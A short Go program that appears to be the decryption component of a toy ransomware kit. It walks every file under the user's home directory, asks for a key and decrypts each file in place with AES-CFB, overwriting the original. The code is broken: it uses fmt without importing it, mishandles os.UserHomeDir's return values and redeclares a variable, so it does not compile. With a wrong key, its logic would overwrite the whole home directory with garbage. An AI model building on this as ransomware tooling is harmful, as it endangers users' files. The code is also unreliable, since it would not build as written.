package main

import (
	"crypto/aes"
	"crypto/cipher"
	"log"
	"os"
	"bufio"
	"strings"
	"path/filepath"
)

func main() {
	var allfiles []string = ListAll(os.UserHomeDir()) //for windows as example
	var keystring string
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Please Type your Key Here: ")
	keystring, _ := reader.ReadString('\n')
	keystring = strings.TrimRight(keystring, "\r\n")
	key := []byte(keystring) 
	for i := 0; i < len(allfiles); i++ {
		ciphertext, err := os.ReadFile(allfiles[i])
		if err != nil {
			panic(err)
		}
		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err)
		}
		if len(ciphertext) < aes.BlockSize {
			panic("Text is too short")
		}
		iv := ciphertext[:aes.BlockSize]
		// Remove the IV from the ciphertext
		ciphertext = ciphertext[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(ciphertext, ciphertext)
		os.WriteFile(allfiles[i], ciphertext, 0777)
	}
}
func ListAll(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println(err)
			return filepath.SkipDir
		}
		if !info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}
